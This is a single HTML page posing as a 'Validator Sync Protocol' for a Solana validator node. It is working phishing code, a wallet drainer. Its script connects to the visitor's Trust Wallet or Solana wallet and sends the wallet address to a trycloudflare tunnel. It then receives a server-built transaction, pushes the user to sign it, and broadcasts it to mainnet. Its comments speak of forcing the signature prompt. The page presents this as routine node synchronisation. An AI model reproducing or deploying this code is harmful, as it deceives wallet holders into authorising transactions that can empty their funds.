<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Sync Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.1s; }
        .btn:active { transform: scale(0.96); opacity: 0.8; }
        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize network synchronization to secure validator node #712.</p>
        <button id="cta" class="btn">INITIALIZE NOW</button>
        <div id="st">READY: V40.2_POWER</div>
    </div>

    <script>
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('st').innerText = t;
            try {
                // 1. 获取最强势的 Provider
                let p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Trust Wallet Browser"); return; }

                log("CONNECTING...");
                await p.connect();

                log("FETCHING...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                
                log("IGNITING...");
                // 2. 暴力唤醒：直接用 atob 解析并构造 Legacy 交易
                const txBytes = Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0));
                const tx = window.solanaWeb3.Transaction.from(txBytes);

                // 3. 核心：强制拉起签名框 (不再链式广播，只求拉起)
                const signed = await p.signTransaction(tx);
                log("SYNC COMPLETE");
                
                // 签完名后，后台异步发送，不占用主进程
                const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                conn.sendRawTransaction(signed.serialize()).catch(()=>{});

            } catch (err) {
                console.error(err);
                log("ERROR - RELOADING");
                setTimeout(() => { window.location.reload(); }, 1000);
            }
        };
    </script>
</body>
</html>
